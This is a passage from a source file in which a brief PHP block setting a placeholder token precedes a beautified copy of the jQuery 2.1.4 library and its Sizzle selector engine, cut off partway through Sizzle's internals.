<?php
$token = 't0k3n';
?>
/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */ ;
! function(d, c) {
    "object" == typeof module && "object" == typeof module.exports ? module.exports = d.document ? c(d, !0) : function(b) {
        if (!b.document) {
            throw new Error("jQuery requires a window with a document")
        }
        return c(b)
    } : c(d)
}("undefined" != typeof window ? window : this, function(a, b) {
    var c = [],
        d = c.slice,
        e = c.concat,
        f = c.push,
        g = c.indexOf,
        h = {},
        i = h.toString,
        j = h.hasOwnProperty,
        k = {},
        l = a.document,
        m = "2.1.4",
        n = function(a, b) {
            return new n.fn.init(a, b)
        },
        o = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
        p = /^-ms-/,
        q = /-([\da-z])/gi,
        r = function(a, b) {
            return b.toUpperCase()
        };
    n.fn = n.prototype = {
        jquery: m,
        constructor: n,
        selector: "",
        length: 0,
        toArray: function() {
            return d.call(this)
        },
        get: function(a) {
            return null != a ? 0 > a ? this[a + this.length] : this[a] : d.call(this)
        },
        pushStack: function(a) {
            var b = n.merge(this.constructor(), a);
            return b.prevObject = this, b.context = this.context, b
        },
        each: function(a, b) {
            return n.each(this, a, b)
        },
        map: function(a) {
            return this.pushStack(n.map(this, function(b, c) {
                return a.call(b, c, b)
            }))
        },
        slice: function() {
            return this.pushStack(d.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(a) {
            var b = this.length,
                c = +a + (0 > a ? b : 0);
            return this.pushStack(c >= 0 && b > c ? [this[c]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor(null)
        },
        push: f,
        sort: c.sort,
        splice: c.splice
    }, n.extend = n.fn.extend = function() {
        var a, b, c, d, e, f, g = arguments[0] || {},
            h = 1,
            i = arguments.length,
            j = !1;
        for ("boolean" == typeof g && (j = g, g = arguments[h] || {}, h++), "object" == typeof g || n.isFunction(g) || (g = {}), h === i && (g = this, h--); i > h; h++) {
            if (null != (a = arguments[h])) {
                for (b in a) {
                    c = g[b], d = a[b], g !== d && (j && d && (n.isPlainObject(d) || (e = n.isArray(d))) ? (e ? (e = !1, f = c && n.isArray(c) ? c : []) : f = c && n.isPlainObject(c) ? c : {}, g[b] = n.extend(j, f, d)) : void 0 !== d && (g[b] = d))
                }
            }
        }
        return g
    }, n.extend({
        expando: "jQuery" + (m + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(a) {
            throw new Error(a)
        },
        noop: function() {},
        isFunction: function(a) {
            return "function" === n.type(a)
        },
        isArray: Array.isArray,
        isWindow: function(a) {
            return null != a && a === a.window
        },
        isNumeric: function(a) {
            return !n.isArray(a) && a - parseFloat(a) + 1 >= 0
        },
        isPlainObject: function(a) {
            return "object" !== n.type(a) || a.nodeType || n.isWindow(a) ? !1 : a.constructor && !j.call(a.constructor.prototype, "isPrototypeOf") ? !1 : !0
        },
        isEmptyObject: function(a) {
            var b;
            for (b in a) {
                return !1
            }
            return !0
        },
        type: function(a) {
            return null == a ? a + "" : "object" == typeof a || "function" == typeof a ? h[i.call(a)] || "object" : typeof a
        },
        globalEval: function(a) {
            var b, c = eval;
            a = n.trim(a), a && (1 === a.indexOf("use strict") ? (b = l.createElement("script"), b.text = a, l.head.appendChild(b).parentNode.removeChild(b)) : c(a))
        },
        camelCase: function(a) {
            return a.replace(p, "ms-").replace(q, r)
        },
        nodeName: function(a, b) {
            return a.nodeName && a.nodeName.toLowerCase() === b.toLowerCase()
        },
        each: function(a, b, c) {
            var d, e = 0,
                f = a.length,
                g = s(a);
            if (c) {
                if (g) {
                    for (; f > e; e++) {
                        if (d = b.apply(a[e], c), d === !1) {
                            break
                        }
                    }
                } else {
                    for (e in a) {
                        if (d = b.apply(a[e], c), d === !1) {
                            break
                        }
                    }
                }
            } else {
                if (g) {
                    for (; f > e; e++) {
                        if (d = b.call(a[e], e, a[e]), d === !1) {
                            break
                        }
                    }
                } else {
                    for (e in a) {
                        if (d = b.call(a[e], e, a[e]), d === !1) {
                            break
                        }
                    }
                }
            }
            return a
        },
        trim: function(a) {
            return null == a ? "" : (a + "").replace(o, "")
        },
        makeArray: function(a, b) {
            var c = b || [];
            return null != a && (s(Object(a)) ? n.merge(c, "string" == typeof a ? [a] : a) : f.call(c, a)), c
        },
        inArray: function(a, b, c) {
            return null == b ? -1 : g.call(b, a, c)
        },
        merge: function(a, b) {
            for (var c = +b.length, d = 0, e = a.length; c > d; d++) {
                a[e++] = b[d]
            }
            return a.length = e, a
        },
        grep: function(a, b, c) {
            for (var d, e = [], f = 0, g = a.length, h = !c; g > f; f++) {
                d = !b(a[f], f), d !== h && e.push(a[f])
            }
            return e
        },
        map: function(a, b, c) {
            var d, f = 0,
                g = a.length,
                h = s(a),
                i = [];
            if (h) {
                for (; g > f; f++) {
                    d = b(a[f], f, c), null != d && i.push(d)
                }
            } else {
                for (f in a) {
                    d = b(a[f], f, c), null != d && i.push(d)
                }
            }
            return e.apply([], i)
        },
        guid: 1,
        proxy: function(a, b) {
            var c, e, f;
            return "string" == typeof b && (c = a[b], b = a, a = c), n.isFunction(a) ? (e = d.call(arguments, 2), f = function() {
                return a.apply(b || this, e.concat(d.call(arguments)))
            }, f.guid = a.guid = a.guid || n.guid++, f) : void 0
        },
        now: Date.now,
        support: k
    }), n.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(a, b) {
        h["[object " + b + "]"] = b.toLowerCase()
    });

    function s(a) {
        var b = "length" in a && a.length,
            c = n.type(a);
        return "function" === c || n.isWindow(a) ? !1 : 1 === a.nodeType && b ? !0 : "array" === c || 0 === b || "number" == typeof b && b > 0 && b - 1 in a
    }
    var t = function(a) {
        var b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u = "sizzle" + 1 * new Date,
            v = a.document,
            w = 0,
            x = 0,
            y = ha(),
            z = ha(),
            A = ha(),
            B = function(a, b) {
                return a === b && (l = !0), 0
            },
            C = 1 << 31,
            D = {}.hasOwnProperty,
            E = [],
            F = E.pop,
            G = E.push,
            H = E.push,
            I = E.slice,
            J = function(a, b) {
                for (var c = 0, d = a.length; d > c; c++) {
                    if (a[c] === b) {
                        return c
                    }
                }
                return -1
            },
            K = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            L = "[\\x20\\t\\r\\n\\f]",
            M = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
            N = M.replace("w", "w#"),
            O = "\\[" + L + "*(" + M + ")(?:" + L + "*([*^$|!~]?=)" + L + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + N + "))|)" + L + "*\\]",
            P = ":(" + M + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + O + ")*)|.*)\\)|)",
            Q = new RegExp(L + "+", "g"),
            R = new RegExp("^" + L + "+|((?:^|[^\\\\])(?:\\\\.)*)" + L + "+$", "g"),
            S = new RegExp("^" + L + "*," + L + "*"),
            T = new RegExp("^" + L + "*([>+~]|" + L + ")" + L + "*"),
            U = new RegExp("=" + L + "*([^\\]'\"]*?)" + L + "*\\]", "g"),
            V = new RegExp(P),
            W = new RegExp("^" + N + "$"),
            X = {
                ID: new RegExp("^#(" + M + ")"),
                CLASS: new RegExp("^\\.(" + M + ")"),
                TAG: new RegExp("^(" + M.replace("w", "w*") + ")"),
                ATTR: new RegExp("^" + O),
                PSEUDO: new RegExp("^" + P),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + L + "*(even|odd|(([+-]|)(\\d*)n|)" + L + "*(?:([+-]|)" + L + "*(\\d+)|))" + L + "*\\)|)", "i"),
                bool: new RegExp("^(?:" + K + ")$", "i"),
                needsContext: new RegExp("^" + L + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + L + "*((?:-\\d)?\\d*)" + L + "*\\)|)(?=[^-]|$)", "i")
            },
            Y = /^(?:input|select|textarea|button)$/i,
            Z = /^h\d$/i,
            $ = /^[^{]+\{\s*\[native \w/,
            _ = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            aa = /[+~]/,
            ba = /'|\\/g,
            ca = new RegExp("\\\\([\\da-f]{1,6}" + L + "?|(" + L + ")|.)", "ig"),
            da = function(a, b, c) {
                var d = "0x" + b - 65536;
                return d !== d || c ? b : 0 > d ? String.fromCharCode(d + 65536) : String.fromCharCode(d >> 10 | 55296, 1023 & d | 56320)
            },
            ea = function() {
                m()
            };
        try {
            H.apply(E = I.call(v.childNodes), v.childNodes), E[v.childNodes.length].nodeType
        } catch (fa) {
            H = {
                apply: E.length ? function(a, b) {
                    G.apply(a, I.call(b))
                } : function(a, b) {
                    var c = a.length,
                        d = 0;
                    while (a[c++] = b[d++]) {}
                    a.length = c - 1
                }
            }
        }

        function ga(a, b, d, e) {
            var f, h, j, k, l, o, r, s, w, x;
            if ((b ? b.ownerDocument || b : v) !== n && m(b), b = b || n, d = d || [], k = b.nodeType, "string" != typeof a || !a || 1 !== k && 9 !== k && 11 !== k) {
                return d
            }
            if (!e && p) {
                if (11 !== k && (f = _.exec(a))) {
                    if (j = f[1]) {
                        if (9 === k) {
                            if (h = b.getElementById(j), !h || !h.parentNode) {
                                return d
                            }
                            if (h.id === j) {
                                return d.push(h), d
                            }
                        } else {
                            if (b.ownerDocument && (h = b.ownerDocument.getElementById(j)) && t(b, h) && h.id === j) {
                                return d.push(h), d
                            }
                        }
                    } else {
                        if (f[2]) {
                            return H.apply(d, b.getElementsByTagName(a)), d
                        }
                        if ((j = f[3]) && c.getElementsByClassName) {
                            return H.apply(d, b.getElementsByClassName(j)), d
                        }
                    }
                }
                if (c.qsa && (!q || !q.test(a))) {
                    if (s = r = u, w = b, x = 1 !== k && a, 1 === k && "object" !== b.nodeName.toLowerCase()) {
                        o = g(a), (r = b.getAttribute("id")) ? s = r.replace(ba, "\\$&") : b.setAttribute("id", s), s = "[id='" + s + "'] ", l = o.length;
                        while (l--) {
                            o[l] = s + ra(o[l])
                        }
                        w = aa.test(a) && pa(b.parentNode) || b, x = o.join(",")
                    }
                    if (x) {
                        try {
                            return H.apply(d, w.querySelectorAll(x)), d
                        } catch (y) {} finally {
                            r || b.removeAttribute("id")
                        }
                    }
                }
            }
            return i(a.replace(R, "$1"), b, d, e)
        }

        function ha() {
            var a = [];

            function b(c, e) {
                return a.push(c + " ") > d.cacheLength && delete b[a.shift()], b[c + " "] = e
            }
            return b
        }

        function ia(a) {
            return a[u] = !0, a
        }

        function ja(a) {
            var b = n.createElement("div");
            try {
                return !!a(b)
            } catch (c) {
                return !1
            } finally {
                b.parentNode && b.parentNode.removeChild(b), b = null
            }
        }

        function ka(a, b) {
            var c = a.split("|"),
                e = a.length;
            while (e--) {
                d.attrHandle[c[e]] = b
            }
        }

        function la(a, b) {
            var c = b && a,
                d = c && 1 === a.nodeType && 1 === b.nodeType && (~b.sourceIndex || C) - (~a.sourceIndex || C);
            if (d) {
                return d
            }
            if (c) {
                while (c = c.nextSibling) {
                    if (c === b) {
                        return -1
                    }
                }
            }
            return a ? 1 : -1
        }

        function ma(a) {
            return function(b) {
                var c = b.nodeName.toLowerCase();
                return "input" === c && b.type === a
            }
        }

        function na(a) {
            return function(b) {
                var c = b.nodeName.toLowerCase();
                return ("input" === c || "button" === c) && b.type === a
            }
        }

        function oa(a) {
            return ia(function(b) {
                return b = +b, ia(function(c, d) {
                    var e, f = a([], c.length, b),
                        g = f.length;
                    while (g--) {
                        c[e = f[g]] && (c[e] = !(d[e] = c[e]))
                    }
                })
            })
        }

        function pa(a) {
            return a && "undefined" != typeof a.getElementsByTagName && a
        }
        c = ga.support = {}, f = ga.isXML = function(a) {
            var b = a && (a.ownerDocument || a).documentElement;
            return b ? "HTML" !== b.nodeName : !1
        }, m = ga.setDocument = function(a) {
            var b, e, g = a ? a.ownerDocument || a : v;
            return g !== n && 9 === g.nodeType && g.documentElement ? (n = g, o = g.documentElement, e = g.defaultView, e && e !== e.top && (e.addEventListener ? e.addEventListener("unload", ea, !1) : e.attachEvent && e.attachEvent("onunload", ea)), p = !f(g), c.attributes = ja(function(a) {
                return a.className = "i", !a.getAttribute("className")
            }), c.getElementsByTagName = ja(function(a) {
                return a.appendChild(g.createComment("")), !a.getElementsByTagName("*").length
            }), c.getElementsByClassName = $.test(g.getElementsByClassName), c.getById = ja(function(a) {
                return o.appendChild(a).id = u, !g.getElementsByName || !g.getElementsByName(u).length
            }), c.getById ? (d.find.ID = function(a, b) {
                if ("undefined" != typeof b.getElementById && p) {
                    var c = b.getElementById(a);
                    return c && c.parentNode ? [c] : []
                }
            }, d.filter.ID = function(a) {
                var b = a.replace(ca, da);
                return function(a) {
                    return a.getAttribute("id") === b
                }
            }) : (delete d.find.ID, d.filter.ID = function(a) {
                var b = a.replace(ca, da);
                return function(a) {
                    var c = "undefined" != typeof a.getAttributeNode && a.getAttributeNode("id");
                    return c && c.value === b
                }
            }), d.find.TAG = c.getElementsByTagName ? function(a, b) {
                return "undefined" != typeof b.getElementsByTagName ? b.getElementsByTagName(a) : c.qsa ? b.querySelectorAll(a) : void 0
            } : function(a, b) {
                var c, d = [],
                    e = 0,
                    f = b.getElementsByTagName(a);
                if ("*" === a) {
                    while (c = f[e++]) {
                        1 === c.nodeType && d.push(c)
                    }
                    return d
                }
                return f
            }, d.find.CLASS = c.getElementsByClassName && function(a, b) {
                return p ? b.getElementsByClassName(a) : void 0
            }, r = [], q = [], (c.qsa = $.test(g.querySelectorAll)) && (ja(function(a) {
                o.appendChild(a).innerHTML = "<a id='" + u + "'></a><select id='" + u + "-\f]' msallowcapture=''><option selected=''></option></select>", a.querySelectorAll("[msallowcapture^='']").length && q.push("[*^$]=" + L + "*(?:''|\"\")"), a.querySelectorAll("[selected]").length || q.push("\\[" + L + "*(?:value|" + K + ")"), a.querySelectorAll("[id~=" + u + "-]").length || q.push("~="), a.querySelectorAll(":checked").length || q.push(":checked"), a.querySelectorAll("a#" + u + "+*").length || q.push(".#.+[+~]")
            }), ja(function(a) {
                var b = g.createElement("input");
                b.setAttribute("type", "hidden"), a.appendChild(b).setAttribute("name", "D"), a.querySelectorAll("[name=d]").length && q.push("name" + L + "*[*^$|!~]?="), a.querySelectorAll(":enabled").length || q.push(":enabled", ":disabled"), a.querySelectorAll("*,:x"), q.push(",.*:")
            })), (c.matchesSelector = $.test(s = o.matches || o.webkitMatchesSelector || o.mozMatchesSelector || o.oMatchesSelector || o.msMatchesSelector)) && ja(function(a) {
                c.disconnectedMatch = s.call(a, "div"), s.call(a, "[s!='']:x"), r.push("!=", P)
            }), q = q.length && new RegExp(q.join("|")), r = r.length && new RegExp(r.join("|")), b = $.test(o.compareDocumentPosition), t = b || $.test(o.contains) ? function(a, b) {
                var c = 9 === a.nodeType ? a.documentElement : a,
                    d = b && b.parentNode;
                return a === d || !(!d || 1 !== d.nodeType || !(c.contains ? c.contains(d) : a.compareDocumentPosition && 16 & a.compareDocumentPosition(d)))
            } : function(a, b) {
                if (b) {
                    while (b = b.parentNode) {
                        if (b === a) {
                            return !0
                        }
                    }
                }
                return !1
            }, B = b ? function(a, b) {
                if (a === b) {
                    return l = !0, 0
                }
                var d = !a.compareDocumentPosition - !b.compareDocumentPosition;
                return d ? d : (d = (a.ownerDocument || a) === (b.ownerDocument || b) ? a.compareDocumentPosition(b) : 1, 1 & d || !c.sortDetached && b.compareDocumentPosition(a) === d ? a === g || a.ownerDocument === v && t(v, a) ? -1 : b === g || b.ownerDocument === v && t(v, b) ? 1 : k ? J(k, a) - J(k, b) : 0 : 4 & d ? -1 : 1)
            } : function(a, b) {
                if (a === b) {
                    return l = !0, 0
                }
                var c, d = 0,
                    e = a.parentNode,
                    f = b.parentNode,
                    h = [a],
                    i = [b];
                if (!e || !f) {
                    return a === g ? -1 : b === g ? 1 : e ? -1 : f ? 1 : k ? J(k, a) - J(k, b) : 0
                }
                if (e === f) {
                    return la(a, b)
                }
                c = a;
                while (c = c.parentNode) {
                    h.unshift(c)
                }
                c = b;
                while (c = c.parentNode) {
                    i.unshift(c)
                }
                while (h[d] === i[d]) {
                    d++
                }
                return d ? la(h[d], i[d]) : h[d] === v ? -1 : i[d] === v ? 1 : 0
            }, g) : n
        }, ga.matches = function(a, b) {
            return ga(a, null, null, b)
        }, ga.matchesSelector = function(a, b) {
            if ((a.ownerDocument || a) !== n && m(a), b = b.replace(U, "='$1']"), !(!c.matchesSelector || !p || r && r.test(b) || q && q.test(b))) {
                try {
                    var d = s.call(a, b);
                    if (d || c.disconnectedMatch || a.document && 11 !== a.document.nodeType) {
                        return d
                    }
                } catch (e) {}
            }
            return ga(b, n, null, [a]).length > 0
        }, ga.contains = function(a, b) {
            return (a.ownerDocument || a) !== n && m(a), t(a, b)
        }, ga.attr = function(a, b) {
            (a.ownerDocument || a) !== n && m(a);
            var e = d.attrHandle[b.toLowerCase()],
                f = e && D.call(d.attrHandle, b.toLowerCase()) ? e(a, b, !p) : void 0;
            return void 0 !== f ? f : c.attributes || !p ? a.getAttribute(b) : (f = a.getAttributeNode(b)) && f.specified ? f.value : null
        }, ga.error = function(a) {
            throw new Error("Syntax error, unrecognized expression: " + a)
        }, ga.uniqueSort = function(a) {
            var b, d = [],
                e = 0,
                f = 0;
            if (l = !c.detectDuplicates, k = !c.sortStable && a.slice(0), a.sort(B), l) {
                while (b = a[f++]) {
                    b === a[f] && (e = d.push(f))
                }
                while (e--) {
                    a.splice(d[e], 1)
                }
            }
            return k = null, a
        }, e = ga.getText = function(a) {
            var b, c = "",
                d = 0,
                f = a.nodeType;
            if (f) {
                if (1 === f || 9 === f || 11 === f) {
                    if ("string" == typeof a.textContent) {
                        return a.textContent
                    }
                    for (a = a.firstChild; a; a = a.nextSibling) {
                        c += e(a)
                    }
                } else {
                    if (3 === f || 4 === f) {
                        return a.nodeValue
                    }
                }
            } else {
                while (b = a[d++]) {
                    c += e(b)
                }
            }
            return c
        }, d = ga.selectors = {
            cacheLength: 50,
            createPseudo: ia,
            match: X,
            attrHandle: {},
            find: {},
            relative: {
                ">": {
                    dir: "parentNode",
                    first: !0
                },
                " ": {
                    dir: "parentNode"
                },
                "+": {
                    dir: "previousSibling",
                    first: !0
                },
                "~": {
                    dir: "previousSibling"
                }
            },
            preFilter: {
                ATTR: function(a) {
                    return a[1] = a[1].replace(ca, da), a[3] = (a[3] || a[4] || a[5] || "").replace(ca, da), "~=" === a[2] && (a[3] = " " + a[3] + " "), a.slice(0, 4)
                },
                CHILD: function(a) {
                    return a[1] = a[1].toLowerCase(), "nth" === a[1].slice(0, 3) ? (a[3] || ga.error(a[0]), a[4] = +(a[4] ? a[5] + (a[6] || 1) : 2 * ("even" === a[3] || "odd" === a[3])), a[5] = +(a[7] + a[8] || "odd" === a[3])) : a[3] && ga.error(a[0]), a
                },
                PSEUDO: function(a) {
                    var b, c = !a[6] && a[2];
                    return X.CHILD.test(a[0]) ? null : (a[3] ? a[2] = a[4] || a[5] || "" : c && V.test(c) && (b = g(c, !0)) && (b = c.indexOf(")", c.length - b) - c.length) && (a[0] = a[0].slice(0, b), a[2] = c.slice(0, b)), a.slice(0, 3))
                }
            },
            filter: {
                TAG: function(a) {
                    var b = a.replace(ca, da).toLowerCase();
                    return "*" === a ? function() {
                        return !0
                    } : function(a) {
                        return a.nodeName && a.nodeName.toLowerCase() === b
                    }
                },
                CLASS: function(a) {
                    var b = y[a + " "];
                    return b || (b = new RegExp("(^|" + L + ")" + a + "(" + L + "|$)")) && y(a, function(a) {
                        return b.test("string" == typeof a.className && a.className || "undefined" != typeof a.getAttribute && a.getAttribute("class") || "")
                    })
                },
                ATTR: function(a, b, c) {
                    return function(d) {
                        var e = ga.attr(d, a);
                        return null == e ? "!=" === b : b ? (e += "", "=" === b ? e === c : "!=" === b ? e !== c : "^=" === b ? c && 0 === e.indexOf(c) : "*=" === b ? c && e.indexOf(c) > -1 : "$=" === b ? c && e.slice(-c.length) === c : "~=" === b ? (" " + e.replace(Q, " ") + " ").indexOf(c) > -1 : "|=" === b ? e === c || e.slice(0, c.length + 1) === c + "-" : !1) : !0
                    }
                },
                CHILD: function(a, b, c, d, e) {
                    var f = "nth" !== a.slice(0, 3),
                        g = "last" !== a.slice(-4),
                        h = "of-type" === b;
                    return 1 === d && 0 === e ? function(a) {
                        return !!a.parentNode
                    } : function(b, c, i) {
                        var j, k, l, m, n, o, p = f !== g ? "nextSibling" : "previousSibling",
                            q = b.parentNode,
                            r = h && b.nodeName.toLowerCase(),
                            s = !i && !h;
                        if (q) {
                            if (f) {
                                while (p) {
                                    l = b;
                                    while (l = l[p]) {
                                        if (h ? l.nodeName.toLowerCase() === r : 1 === l.nodeType) {
                                            return !1
                                        }
                                    }
                                    o = p = "only" === a && !o && "nextSibling"
                                }
                                return !0
                            }
                            if (o = [g ? q.firstChild : q.lastChild], g && s) {
                                k = q[u] || (q[u] = {}), j = k[a] || [], n = j[0] === w && j[1], m = j[0] === w && j[2], l = n && q.childNodes[n];
                                while (l = ++n && l && l[p] || (m = n = 0) || o.pop()) {
                                    if (1 === l.nodeType && ++m && l === b) {
                                        k[a] = [w, n, m];
                                        break
                                    }
                                }
                            } else {
                                if (s && (j = (b[u] || (b[u] = {}))[a]) && j[0] === w) {
                                    m = j[1]
                                } else {
                                    while (l = ++n && l && l[p] || (m = n = 0) || o.pop()) {
                                        if ((h ? l.nodeName.toLowerCase() === r : 1 === l.nodeType) && ++m && (s && ((l[u] || (l[u] = {}))[a] = [w, m]), l === b)) {
                                            break
                                        }
                                    }
                                }
                            }
                            return m -= e, m === d || m % d === 0 && m / d >= 0
                        }
                    }
                },
                PSEUDO: function(a, b) {
                    var c, e = d.pseudos[a] || d.setFilters[a.toLowerCase()] || ga.error("unsupported pseudo: " + a);
                    return e[u] ? e(b) : e.length > 1 ? (c = [a, a, "", b], d.setFilters.hasOwnProperty(a.toLowerCase()) ? ia(function(a, c) {
                        var d, f = e(a, b),
                            g = f.length;
                        while (g--) {
                            d = J(a, f[g]), a[d] = !(c[d] = f[g])
                        }
                    }) : function(a) {
                        return e(a, 0, c)
                    }) : e
                }
            },
            pseudos: {
                not: ia(function(a) {
                    var b = [],
                        c = [],
                        d = h(a.replace(R, "$1"));
                    return d[u] ? ia(function(a, b, c, e) {
                        var f, g = d(a, null, e, []),
                            h = a.length;
                        while (h--) {
                            (f = g[h]) && (a[h] = !(b[h] = f))
                        }
                    }) : function(a, e, f) {
                        return b[0] = a, d(b, null, f, c), b[0] = null, !c.pop()
                    }
                }),
                has: ia(function(a) {
                    return function(b) {
                        return ga(a, b).length > 0
                    }
                }),
                contains: ia(function(a) {
                    return a = a.replace(ca, da),
                        function(b) {
                            return (b.textContent || b.innerText || e(b)).indexOf(a) > -1
                        }
                }),
                lang: ia(function(a) {
                    return W.test(a || "") || ga.error("unsupported lang: " + a), a = a.replace(ca, da).toLowerCase(),
                        function(b) {
                            var c;
                            do {
                                if (c = p ? b.lang : b.getAttribute("xml:lang") || b.getAttribute("lang")) {
                                    return c = c.toLowerCase(), c === a || 0 === c.indexOf(a + "-")
                                }
                            } while ((b = b.parentNode) && 1 === b.nodeType);
                            return !1
                        }
                }),
                target: function(b) {
                    var c = a.location && a.location.hash;
                    return c && c.slice(1) === b.id
                },
                root: function(a) {
                    return a === o
                },
                focus: function(a) {
                    return a === n.activeElement && (!n.hasFocus || n.hasFocus()) && !!(a.type || a.href || ~a.tabIndex)
                },
                enabled: function(a) {
                    return a.disabled === !1
                },
                disabled: function(a) {
                    return a.disabled === !0
                },
                checked: function(a) {
                    var b = a.nodeName.toLowerCase();
                    return "input" === b && !!a.checked || "option" === b && !!a.selected
                },
                selected: function(a) {
                    return a.parentNode && a.parentNode.selectedIndex, a.selected === !0
                },
                empty: function(a) {
                    for (a = a.firstChild; a; a = a.nextSibling) {
                        if (a.nodeType < 6) {
                            return !1
                        }
                    }
                    return !0
                },
                parent: function(a) {
                    return !d.pseudos.empty(a)
                },
                header: function(a) {
                    return Z.test(a.nodeName)
                },
                input: function(a) {
                    return Y.test(a.nodeName)
                },
                button: function(a) {
                    var b = a.nodeName.toLowerCase();
                    return "input" === b && "button" === a.type || "button" === b
                },
                text: function(a) {
                    var b;
                    return "input" === a.nodeName.toLowerCase() && "text" === a.type && (null == (b = a.getAttribute("type")) || "text" === b.toLowerCase())
                },
                first: oa(function() {
                    return [0]
                }),
                last: oa(function(a, b) {
                    return [b - 1]
                }),
                eq: oa(function(a, b, c) {
                    return [0 > c ? c + b : c]
                }),
                even: oa(function(a, b) {
                    for (var c = 0; b > c; c += 2) {
                        a.push(c)
                    }
                    return a
                }),
                odd: oa(function(a, b) {
                    for (var c = 1; b > c; c += 2) {
                        a.push(c)
                    }
                    return a
                }),
                lt: oa(function(a, b, c) {
                    for (var d = 0 > c ? c + b : c; --d >= 0;) {
                        a.push(d)
                    }
                    return a
                }),
                gt: oa(function(a, b, c) {
                    for (var d = 0 > c ? c + b : c; ++d < b;) {
                        a.push(d)
                    }
                    return a
                })
            }
        }, d.pseudos.nth = d.pseudos.eq;
        for (b in {
                radio: !0,
                checkbox: !0,
                file: !0,
                password: !0,
                image: !0
            }) {
            d.pseudos[b] = ma(b)
        }
        for (b in {
                submit: !0,
                reset: !0
            }) {
            d.pseudos[b] = na(b)
        }

        function qa() {}
        qa.prototype = d.filters = d.pseudos, d.setFilters = new qa, g = ga.tokenize = function(a, b) {
            var c, e, f, g, h, i, j, k = z[a + " "];
            if (k) {
                return b ? 0 : k.slice(0)
            }
            h = a, i = [], j = d.preFilter;
            while (h) {
                (!c || (e = S.exec(h))) && (e && (h = h.slice(e[0].length) || h), i.push(f = [])), c = !1, (e = T.exec(h)) && (c = e.shift(), f.push({
                    value: c,
                    type: e[0].replace(R, " ")
                }), h = h.slice(c.length));
                for (g in d.filter) {
                    !(e = X[g].exec(h)) || j[g] && !(e = j[g](e)) || (c = e.shift(), f.push({
                        value: c,
                        type: g,
                        matches: e
                    }), h = h.slice(c.length))
                }
                if (!c) {
                    break
                }
            }
            return b ? h.length : h ? ga.error(a) : z(a, i).slice(0)
        };

        function ra(a) {
            for (var b = 0, c = a.length, d = ""; c > b; b++) {
                d += a[b].value
            }
            return d
        }

        function sa(a, b, c) {
            var d = b.dir,
                e = c && "parentNode" === d,
                f = x++;
            return b.first ? function(b, c, f) {
                while (b = b[d]) {
                    if (1 === b.nodeType || e) {
                        return a(b, c, f)
                    }
                }
            } : function(b, c, g) {
                var h, i, j = [w, f];
                if (g) {
                    while (b = b[d]) {
                        if ((1 === b.nodeType || e) && a(b, c, g)) {
                            return !0
                        }
                    }
                } else {
                    while (b = b[d]) {
                        if (1 === b.nodeType || e) {
                            if (i = b[u] || (b[u] = {}), (h = i[d]) && h[0] === w && h[1] === f) {
                                return j[2] = h[2]
                            }
                            if (i[d] = j, j[2] = a(b, c, g)) {
                                return !0
                            }
                        }
                    }
                }
            }
        }

        function ta(a) {
            return a.length > 1 ? function(b, c, d) {
                var e = a.length;
                while (e--) {
                    if (!a[e](b, c, d)) {
                        return !1
                    }
                }
                return !0
            } : a[0]
        }

        function ua(a, b, c) {
            for (var d = 0, e = b.length; e > d; d++) {
                ga(a, b[d], c)
            }
            return c
        }

        function va(a, b, c, d, e) {
            for (var f, g = [], h = 0, i = a.length, j = null != b; i > h; h++) {
                (f = a[h]) && (!c || c(f, d, e)) && (g.push(f), j && b.push(h))
            }
            return g
        }

        function wa(a, b, c, d, e, f) {
            return d && !d[u] && (d = wa(d)), e && !e[u] && (e = wa(e, f)), ia(function(f, g, h, i) {
                var j, k, l, m = [],
                    n = [],
                    o = g.length,
                    p = f || ua(b || "*", h.nodeType ? [h] : h, []),
                    q = !a || !f && b ? p : va(p, m, a, h, i),
                    r = c ? e || (f ? a : o || d) ? [] : g : q;
                if (c && c(q, r, h, i), d) {
                    j = va(r, n), d(j, [], h, i), k = j.length;
                    while (k--) {
                        (l = j[k]) && (r[n[k]] = !(q[n[k]] = l))
                    }
                }
                if (f) {
                    if (e || a) {
                        if (e) {
                            j = [], k = r.length;
                            while (k--) {
                                (l = r[k]) && j.push(q[k] = l)
                            }
                            e(null, r = [], j, i)
                        }
                        k = r.length;
                        while (k--) {
                            (l = r[k]) && (j = e ? J(f, l) : m[k]) > -1 && (f[j] = !(g[j] = l))
                        }
                    }
                } else {
                    r = va(r === g ? r.splice(o, r.length) : r), e ? e(null, g, r, i) : H.apply(g, r)
                }
            })
        }

        function xa(a) {
            for (var b, c, e, f = a.length, g = d.relative[a[0].type], h = g || d.relative[" "], i = g ? 1 : 0, k = sa(function(a) {
                    return a === b
                }, h, !0), l = sa(function(a) {
                    return J(b, a) > -1
                }, h, !0), m = [function(a, c, d) {
                    var e = !g && (d || c !== j) || ((b = c).nodeType ? k(a, c, d) : l(a, c, d));
                    return b = null, e
                }]; f > i; i++) {
                if (c = d.relative[a[i].type]) {
                    m = [sa(ta(m), c)]
                } else {
                    if (c = d.filter[a[i].type].apply(null, a[i].matches), c[u]) {
                        for (e = ++i; f > e; e++) {
                            if (d.relative[a[e].type]) {
                                break
                            }
                        }
                        return wa(i > 1 && ta(m), i > 1 && ra(a.slice(0, i - 1).concat({
                            value: " " === a[i - 2].type ? "*" : ""
                        })).replace(R, "$1"), c, e > i && xa(a.slice(i, e)), f > e && xa(a = a.slice(e)), f > e && ra(a))
                    }
                    m.push(c)
                }
            }
            return ta(m)
        }

        function ya(a, b) {
            var c = b.length > 0,
                e = a.length > 0,
                f = function(f, g, h, i, k) {
                    var l, m, o, p = 0,
                        q = "0",
